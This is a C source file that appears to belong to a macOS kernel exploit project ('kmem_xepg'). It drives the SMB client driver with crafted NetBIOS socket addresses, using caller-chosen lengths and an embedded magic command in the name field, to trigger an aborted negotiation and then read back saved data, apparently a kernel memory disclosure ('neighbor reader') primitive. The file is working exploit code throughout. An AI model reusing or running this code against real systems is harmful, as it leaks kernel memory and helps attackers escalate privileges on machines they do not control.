//
//  zkext_neighbor_reader_xs.c
//  kmem_xepg
//
//  Created by admin on 1/3/22.
//

#include <assert.h>
#include <stdlib.h>
#include <stdatomic.h>

#include <sys/errno.h>
#include <dispatch/dispatch.h>

#include <xe/util/assert.h>

#include "../smb/client.h"
#include "../public/xe_kmem/smbx_conf.h"

#include "kmem_neighbor_reader.h"


struct kmem_neighbor_reader {
    int fd_paddr_reader;
    int fd_kmem_reader;
    _Atomic uint32_t keygen;
};

static dispatch_once_t g_kmem_neighbor_reader_token;
static struct kmem_neighbor_reader* g_kmem_neighbor_reader;


struct kmem_neighbor_reader* kmem_neighbor_reader_create(const struct sockaddr_in* smb_addr) {
    struct kmem_neighbor_reader* reader = malloc(sizeof(struct kmem_neighbor_reader));
    reader->fd_paddr_reader = smb_client_open_dev();
    xe_assert_cond(reader->fd_paddr_reader, >=, 0);
    reader->fd_kmem_reader = smb_client_open_dev();
    xe_assert_cond(reader->fd_kmem_reader, >=, 0);
    
    int error = smb_client_ioc_negotiate(reader->fd_paddr_reader, smb_addr, sizeof(*smb_addr), FALSE);
    xe_assert_err(error);
    
    error = smb_client_ioc_tcon(reader->fd_paddr_reader, "default");
    xe_assert_err(error);
    return reader;
}

void kmem_neighbor_reader_read(const struct sockaddr_in* smb_addr, uint8_t saddr_snb_len, uint32_t saddr_ioc_len, uint8_t saddr_snb_name, uint8_t laddr_snb_len, uint32_t laddr_ioc_len, uint8_t laddr_snb_name, char* dst, uint32_t dst_size) {
    
    dispatch_once(&g_kmem_neighbor_reader_token, ^{
        g_kmem_neighbor_reader = kmem_neighbor_reader_create(smb_addr);
    });
    
    xe_assert(saddr_snb_name != 0xff);
    xe_assert(laddr_snb_name != 0xff);
    xe_assert_cond(laddr_ioc_len, >=, offsetof(struct sockaddr_nb, snb_name) + sizeof(struct xe_kmem_nb_laddr_cmd) + 1);
    
    struct sockaddr_nb saddr;
    struct sockaddr_nb laddr;
    
    bzero(&saddr, sizeof(saddr));
    bzero(&laddr, sizeof(laddr));
    
    saddr.snb_family = AF_NETBIOS;
    saddr.snb_addrin = *smb_addr;
    saddr.snb_len = saddr_snb_len;
    saddr.snb_name[0] = saddr_snb_name;
    
    laddr.snb_family = AF_NETBIOS;
    laddr.snb_len = laddr_snb_len;
    laddr.snb_name[0] = laddr_snb_name;
    static_assert(sizeof(laddr.snb_name) >= sizeof(struct xe_kmem_nb_laddr_cmd) + 1, "");
    struct xe_kmem_nb_laddr_cmd* cmd_paddr = (struct xe_kmem_nb_laddr_cmd*)&laddr.snb_name[1];
    cmd_paddr->key = atomic_fetch_add(&g_kmem_neighbor_reader->keygen, 1);
    cmd_paddr->magic = XE_KMEM_NB_LADDR_CMD_MAGIC;
    cmd_paddr->flags = XE_KMEM_NB_LADDR_CMD_FLAG_FAIL | XE_KMEM_NB_LADDR_CMD_FLAG_SAVE;
    
    int error = smb_client_ioc_negotiate_nb(g_kmem_neighbor_reader->fd_kmem_reader, &saddr, saddr_ioc_len, &laddr, laddr_ioc_len);
    xe_assert_cond(error, ==, ECONNABORTED);
    
    error = smb_client_ioc_read_saved_nb_ssn_request(g_kmem_neighbor_reader->fd_paddr_reader, cmd_paddr->key, dst, dst_size);
    xe_assert_err(error);
}

